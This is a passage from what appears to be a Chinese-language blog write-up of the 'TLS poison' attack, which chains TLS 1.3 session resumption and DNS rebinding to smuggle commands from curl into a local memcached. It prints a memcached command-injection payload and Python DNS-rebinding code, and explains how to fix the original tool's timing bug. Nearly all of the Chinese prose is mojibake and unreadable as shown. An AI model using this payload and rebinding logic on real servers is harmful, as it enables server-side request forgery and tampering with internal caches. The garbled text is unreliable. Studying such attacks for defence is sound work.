è¿›è¡Œæ¡æ‰‹æ•°æ®äº¤äº’ï¼Œå½“ç„¶è¿™é‡Œéœ€è¦ä½ çš„ curl æ”¯æŒ TLS 1.3 </li><li>TLS 1.3 ä½¿ç”¨ PSK è¿›è¡Œ Session Resumption</li><li>PSK åé¢è¿˜åŒ…å«äº†å¾ˆå¤šä¸ª 0x00 ï¼Œæ€»é•¿åº¦è¿œè¿œè¶…è¿‡äº† 32 å­—èŠ‚</li></ul><p>æ‰€ä»¥ä½œè€…åŸä»“åº“å®ç°çš„æ˜¯åŸºäº TLS 1.3 çš„ Session Resumption ï¼Œåé¢æˆ‘ä»¬å…·ä½“çœ‹å…¶å®ç°ä»£ç å‘ç°ä¹Ÿç¡®æ˜¯å¦‚æ­¤ï¼Œä½œè€…åªå®ç°äº†åŸºäº PSK çš„ä¼šè¯æ¢å¤ SSRF ï¼Œå…¶ä»–å‡ ç±»éƒ½æ²¡æœ‰å®ç°ã€‚</p><p>æ‰€ä»¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æœ‰äº›æ˜æœ—äº†ï¼Œé‚£æˆ‘ä»¬å†æ¥å°è¯•ä¸€ä¸‹è¶…è¶Š 32 å­—èŠ‚çš„ payload ï¼Œçœ‹çœ‹åˆ°åº•èƒ½ä¸èƒ½å®ç°ã€‚ä¾æ—§æŒ‰ç…§å¦‚ä¸Šçš„æµç¨‹åšå¥½ setup ï¼Œåªä¸è¿‡ä¸åŒçš„æ˜¯æˆ‘ä»¬éœ€è¦åœ¨ TLS VPS çš„ redis ä¸Šä¿®æ”¹ä¸€ä¸‹ payload ï¼Œè¿™æ¬¡æˆ‘ä»¬éšæ„ä¿®æ”¹ä¸€ä¸‹ï¼Œåªè¦å¤Ÿé•¿å°±å¥½ï¼Œè¿™é‡Œä¸€å®šè¦æ³¨æ„æŠŠè¦å‘ç»™ memcached çš„ payload å½“ä¸­çš„<code>set</code>æŒ‡ä»¤çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¿®æ”¹æˆå…¶ value çš„é•¿åº¦ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¿™é‡Œä¿®æ”¹ payload ä¸ºï¼š<code>set payload "\r\nset foo 0 0 79\nThis time I'm really in your cache and I can write what I want into your cache.\r\n"</code>ã€‚ï¼ˆå½“ç„¶è¿˜æ˜¯å»ºè®®åœ¨å®éªŒä¹‹å‰ä½¿ç”¨ä¹‹å‰çš„æ–¹æ³•æµ‹è¯•ä¸€ä¸‹è‡ªå·±çš„ payload èƒ½å¦å†™å…¥åˆ° memcached å½“ä¸­ï¼‰</p><p>Ok. Here we go.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/3.png" alt=""></p><p>å½“å½“ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥å†™å…¥è¶…è¿‡ 32 å­—èŠ‚çš„æ•°æ®å•¦ï¼</p><h3 id="The-Bad-Code-IN-Original-Method"><a href="#The-Bad-Code-IN-Original-Method" class="headerlink" title="The Bad Code IN Original Method"></a>The Bad Code IN Original Method</h3><p>ç»è¿‡ä¸Šè¿°ä¸¤ä¸ªå®éªŒï¼Œæˆ‘å·²ç»çŒœåˆ°å¯èƒ½å¤§å¤šæ•°åŒå­¦çš„å®éªŒå¹¶ä¸æ˜¯ä¸€æ¬¡éƒ½æˆåŠŸï¼Œå¾ˆå¤šäººå¯èƒ½éƒ½æ˜¯å¾—åˆ°ç¬¬ä¸€ç§ç»“æœï¼Œä¹Ÿå°±æ˜¯è¶…è¿‡äº† curl æœ€å¤šé‡å®šå‘æ¬¡æ•°è€Œå¤±è´¥ï¼Œè€Œå¯¼è‡´è¿™ä¸ªç»“æœçš„åŸå› ä¸€èˆ¬æ¥è¯´å°±æ˜¯ DNS Rebinding å¤±è´¥ï¼Œæ²¡æœ‰åœ¨ç¬¬äºŒæ¬¡ DNS æŸ¥è¯¢çš„æ—¶å€™è¿”å› 127.0.0.1 ï¼Œè¿™æ ·ä¸€ç›´åœ¨ä¸ TLSServer è¿›è¡Œé€šä¿¡å¯¼è‡´æœ€åé‡å®šå‘æ¬¡æ•°è¿‡å¤šè€Œå¤±è´¥ã€‚</p><p>è®©æˆ‘ä»¬ç®€å•çœ‹çœ‹ä½œè€…çš„ DNS Rebinding æ€ä¹ˆå†™çš„ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä»¥ä¸‹ä»£ç ï¼š</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    last_ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> HOSTS_LIST:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(d[<span class="hljs-number">0</span>], domain.lower()) <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            spoof_count = (spoof_count + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-comment"># The below line will result in the answer switching after 30 seconds,</span></span><br><span class="line">            <span class="hljs-comment"># instead of alternating</span></span><br><span class="line">            <span class="hljs-comment"># return d[1] if (time() - start &gt; 30) else args.TARGET</span></span><br><span class="line">            <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> spoof_count == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> args.TARGET</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>è¿™æ˜¯ä½œè€…è‡ªå·±å†™çš„ä»£ç </strong>ï¼Œè¿™æ®µä»£ç çš„æ„æ€å¤§æ¦‚å°±æ˜¯é€šè¿‡è®°å½• DNS æŸ¥è¯¢çš„æ€»æ¬¡æ•°ï¼Œå¦‚æœæŸ¥è¯¢æ€»æ¬¡æ•°æ¨¡ 3 ä¸º 0 çš„è¯ï¼Œä¹Ÿå°±æ˜¯ 3 çš„å€æ•°ï¼Œè¿”å›<code>d[1]</code>ï¼Œä¹Ÿå°±æ˜¯ 127.0.0.1 ï¼Œå¦åˆ™å°±è¿”å›æˆ‘ä»¬çš„ TLS VPS IP ã€‚è¿™ç§æ–¹å¼æˆ‘ä»¬æš‚ä¸”ä¸è°ˆï¼Œå…ˆä¸å…³æ³¨ã€‚</p><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹å…¶æ³¨é‡Šçš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨é‡Šå½“ä¸­çš„æ–¹å¼ï¼ŒDNS Server å¯åŠ¨ 30s ä¹‹å‰è¿”å› TLS VPS IP ï¼Œåªéœ€è¦åœ¨ 30s ä¹‹åï¼Œ DNS å°±ä¼šä¸€ç›´è¿”å›æˆ‘ä»¬çš„ç›®æ ‡åœ°å€ 127.0.0.1 ã€‚</p><p>æˆ‘ä»¬ç°åœ¨å…ˆæ¥å—ä¸€ä¸ªç»“è®ºï¼Œå°±æ˜¯ curl å¯¹äºä¸€ä¸ªåŸŸåæœ‰ä¸€å®šçš„ DNS ç¼“å­˜æ—¶é—´ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è®© curl ç¬¬ä¸€æ¬¡ DNS æŸ¥è¯¢å¾—åˆ° TLS VPS IP ï¼Œåœ¨ç¼“å­˜æ—¶é—´ç»“æŸä¹‹åæŸ¥è¯¢çš„ç»“æœè¿”å› 127.0.0.1 ï¼Œé‚£ä¹ˆæ³¨é‡Šå½“ä¸­çš„æ–¹å¼æ˜¯æœ€å¥½ä¸è¿‡çš„äº†ã€‚</p><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å…¬å¼€å¤„åˆ‘ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä½œè€…æ˜¯ä¸æ˜¯ç²—å¿ƒå¤§æ„å†™å‡ºè¿™æ ·çš„ä»£ç ï¼‰ï¼š</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    last_ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> HOSTS_LIST:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(d[<span class="hljs-number">0</span>], domain.lower()) <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            spoof_count = (spoof_count + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-comment"># The below line will result in the answer switching after 30 seconds,</span></span><br><span class="line">            <span class="hljs-comment"># instead of alternating</span></span><br><span class="line">            <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> (time() - start &gt; <span class="hljs-number">30</span>) <span class="hljs-keyword">else</span> args.TARGET</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>è®©æˆ‘ä»¬å†æ¥å›é¡¾è¿™æ®µä»£ç ï¼šå—¯ï¼Œå†™çš„éå¸¸çš„æ£’ï¼Œç”¨<code>time()</code>è®¡æ—¶ï¼Œè¶…è¿‡ 30s å°±è¿”å›ç›®æ ‡ IP ï¼Œå¤ªå¯¹äº†å“¥ã€‚å¦‚æœè¿˜æ²¡çœ‹å‡ºæ¥çš„åŒå­¦ï¼Œæˆ‘å†ç®€åŒ–ä¸€ä¸‹ï¼š</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    <span class="hljs-keyword">if</span> time() - start &gt; <span class="hljs-number">30</span>:</span><br><span class="line">    <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">    <span class="hljs-keyword">return</span> args.TARGET</span><br></pre></td></tr></tbody></table></figure><p></p><p>æˆ‘è§‰å¾—åªè¦ä½ çš„æœºå™¨ç¨å¾®æ­£å¸¸ä¸€ç‚¹ï¼Œæ­£å¸¸æ‰§è¡Œå‡ è¡Œèµ‹å€¼è¯­å¥çš„ python ä»£ç çš„é€Ÿåº¦åº”è¯¥ä¸ä¼šè¶…è¿‡ 30s å§ï¼Ÿè¿™ä¸ªåœ¨ä½¿ç”¨<code>time()</code>å‡½æ•°å¯¹<code>start</code>å˜é‡èµ‹å€¼ä¹‹åï¼Œåˆä½¿ç”¨äº†<code>time()</code>å‡½æ•°è·å–æ—¶é—´æˆ³ä¸<code>start</code>å˜é‡ç›¸å‡ã€‚å•Šè¿™ï¼Œåæ­£æˆ‘çš„æœºå™¨æ˜¯å‡ä¸å‡º 30s ï¼Œè¿™æ®µä»£ç å°±è®©æˆ‘æ„Ÿè§‰åˆ°ä½œè€…å†™çš„éå¸¸çš„ç¦»è°±â€¦å½“ç„¶è¿™é‡Œçº¯å±ä¸ªäººåæ§½ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦æŠŠå‡½æ•°å†…å¯¹äº<code>start</code>å˜é‡å†æ¬¡èµ‹å€¼çš„æ“ä½œåˆ é™¤å°±è¡Œäº†ï¼Œè¿™æ ·<code>start</code>å¾—åˆ°çš„æ—¶é—´å°±æ˜¯ç¨‹åºå¯åŠ¨çš„æ—¶é—´äº†ã€‚ï¼ˆé™¤éæˆ‘å“ªé‡Œè¯¯è§£äº†è¿™æ®µä»£ç ï¼‰</p><p>å½“ç„¶æˆ‘å»ºè®®æ—¶é—´é—´éš”åœ¨ 10s è¿™æ ·å°±è¡Œï¼Œè¿™æ ·å°±èƒ½æ¯”è¾ƒç²¾å‡†çš„è®© curl åœ¨ç¬¬äºŒæ¬¡ DNS æŸ¥è¯¢çš„æ—¶å€™æ‹¿åˆ° 127.0.0.1 çš„å“åº”äº†ã€‚ï¼ˆä¸€åªé»„è‰²çš„å“†å•¦Aæ¢¦ï¼šè¿™äººä¹Ÿå¤ªèœäº†.jpg</p><p>å½“ç„¶ï¼Œæˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨æ€»æ¬¡æ•°çš„æ–¹å¼ï¼Œå¦‚æœæ€»æ¬¡æ•°è¶…è¿‡ä¸€æ¬¡ç«‹å³è¿”å› 127.0.0.1 ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡ä¸‡ä¸€è¢«åˆ«äººæŸ¥äº†ç¬¬ä¸€æ¬¡å°±å°´å°¬äº†ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ä¸ä¼šã€‚</p><h3 id="The-Optimization-Method-OF-DNS-Rebinding"><a href="#The-Optimization-Method-OF-DNS-Rebinding" class="headerlink" title="The Optimization Method OF DNS Rebinding"></a>The Optimization Method OF DNS Rebinding</h3><p>å°±åƒæˆ‘ä»¬ä¸Šæ–‡æ‰€æåˆ°çš„ï¼Œè¿™ä¸ªæ”»å‡»ä¸»è¦å–å†³äºä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯ TLS Session Resumption ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ DNS Rebinding ã€‚ä¸€ä¸ªå¥½çš„ DNS Rebinding å¯ä»¥èµ·åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœã€‚</p><p>æˆ‘è¯¢é—®äº†ä¸€äº› CTFer ï¼Œä¹ŸæŸ¥è¯äº†ä¸€äº› DNS Rebinding çš„å·¥å…·ï¼Œè¯¸å¦‚ <a href="https://github.com/taviso/rbndr" target="_blank" rel="noopener">rbndr</a> / ceye ç­‰æ¯”è¾ƒå¸¸ç”¨çš„å·¥å…·ï¼Œä¸€èˆ¬ç»Ÿä¸€åšæ³•éƒ½æ˜¯æ¯æ¬¡è¿”å›ä¸€ä¸ª TTL è¾ƒå°çš„ A è®°å½•ï¼Œåªä¸è¿‡æ¯æ¬¡è¿”å›çš„è®°å½•ä¸åŒï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨ç”¨æˆ·æŒ‡å®šçš„ A è®°å½•å½“ä¸­éšæœºæ¦‚ç‡è¿”å›ä¸€ä¸ªã€‚è¿™æ ·å¦‚æœä½¿ç”¨è¿™äº› DNS Rebinding å·¥å…·åœ¨è¿™é‡Œå°±ä¸æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„é€‰æ‹©ã€‚</p><p>éšåï¼Œ@zhaojin åœ¨ <a href="https://www.zhaoj.in/read-6681.html" target="_blank" rel="noopener">åŸºäº A å’Œ AAAA è®°å½•çš„ä¸€ç§æ–° DNS Rebinding å§¿åŠ¿â€“ä»è¥¿æ¹–è®ºå‰‘2020 Web HelloDiscuzQ é¢˜å¯¹ Blackhat ä¸Šçš„è®®é¢˜åšå‡å</a> æåˆ°æ–°çš„æ–¹æ³•ï¼Œä¼¼ä¹å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåŸŸååŒæ—¶åˆ†é…ä¸€ä¸ª A è®°å½•è·Ÿä¸€ä¸ª AAAA è®°å½•ï¼Œå› ä¸º curl ä¼šä¼˜å…ˆä½¿ç”¨ AAAA è®°å½•ï¼Œè€Œå½“ AAAA è®°å½•çš„ IPv6 æ— æ³•å»ºç«‹è¿æ¥æ—¶ï¼Œä¼šå°è¯•è·Ÿ A è®°å½•çš„ IPv4 è¿›è¡Œå»ºç«‹è¿æ¥ã€‚æˆ‘è§‰å¾—æ˜¯ä¸ªå¾ˆæœ‰è¶£çš„æƒ³æ³•ï¼Œæ•´ä¸ªæ€è·¯å¤§è‡´å¦‚ä¸‹ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡è®© curl å»è®¿é—®æ¶æ„çš„ HTTPS æœåŠ¡å™¨ï¼Œæ‹¿åˆ°ä¸€ä¸ªæ¶æ„çš„ SessionID</li><li>ç„¶åä½¿æ¶æ„çš„ HTTPS æœåŠ¡å™¨æ— æ³•æ¥æ”¶æ–°çš„è¿æ¥</li><li>è¿™æ—¶æ¶æ„çš„ HTTPS ç»™å‡ºç¬¬ä¸€æ¬¡è¿”å›çš„ç»“æœï¼Œä½¿å…¶è¿›è¡ŒåŒåŸŸåè·³è½¬</li><li>è·³è½¬æ—¶ä¼šå°è¯•è¿›è¡Œæ–°è¿æ¥ï¼Œå‘ç°æ¶æ„çš„ HTTPS æœåŠ¡å™¨æ— æ³•è¿æ¥ã€‚</li><li>åˆ™ä¼šå°è¯•è¿æ¥è¿™ä¸ªåŸŸåä¸‹çš„å…¶ä»–è®°å½•æ‰€æŒ‡å‘çš„åœ°å€ï¼Œå¹¶å¸¦ä¸Š SessionID</li></ul><blockquote><p>â€‹    åœ¨ CURL ä¸­ï¼Œå¯¹äºä¸€ä¸ªåŸŸåï¼Œå¦‚æœåŒæ—¶å…·æœ‰ A è®°å½•å’Œ AAAA è®°å½•ï¼Œé‚£ä¹ˆ CURL ä¼šå»ä¼˜å…ˆè¯·æ±‚ AAAA æˆ–è€… A è®°å½•æ‰€æŒ‡å‘çš„åœ°å€ï¼Œå¦‚æœè¿™äº›åœ°å€æ— æ³•è¿æ¥ï¼Œåˆ™ä¼šå°è¯•è¿æ¥åŒæ—¶å¾—åˆ°çš„ A è®°å½•æˆ–è€… AAAA è®°å½•ã€‚</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šå‡ºç°ï¼š</p><p>AAAA è®°å½•åœ°å€ä¸é€šï¼Œä¼šè¿æ¥åˆ° A è®°å½•åœ°å€ä¸Šã€‚</p><p>Aè®°å½•åœ°å€ä¸é€šï¼Œä¼šè¿æ¥åˆ° AAAA è®°å½•åœ°å€ä¸Šã€‚</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.zhaoj.in/wp-content/uploads/2020/10/1602817765b4f463b4513262746c16fe6f1b72278f-1024x377.png" alt=""></p><p>ä½†æ˜¯æ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œå¦‚æœå¯¹äºä¸€ä¸ªåŸŸåè¿›è¡Œè¿™æ ·çš„è®¾ç½®ï¼ŒAAAA è®°å½•æŒ‡å‘ TLS VPS çš„ IPv6 åœ°å€ä¸Šï¼ŒA è®°å½•æŒ‡å‘ 127.0.0.1 åœ°å€ï¼Œå®é™…æµ‹è¯• å½“ä¸­ï¼Œ curl æ€»æ˜¯ä¼˜å…ˆ 127.0.0.1 ï¼Œå¹¶ä¸”æ²¡æœ‰éšæœºçš„åšæ³•ï¼›å¦‚æœå¯¹äºä¸€ä¸ªåŸŸåè¿›è¡Œè¿™æ ·çš„è®¾ç½®ï¼ŒAAAA è®°å½•æŒ‡å‘ ::1 åœ°å€ä¸Šï¼ŒA è®°å½•æŒ‡å‘ TLS VPS çš„ IPv4 åœ°å€ä¸Šï¼Œcurl æ€»æ˜¯ä¼˜å…ˆ ::1 </p><blockquote class="colorquote success"><p>2021/05/14 æ›´æ–°ï¼š</p><p>æ„Ÿè°¢ @chuye 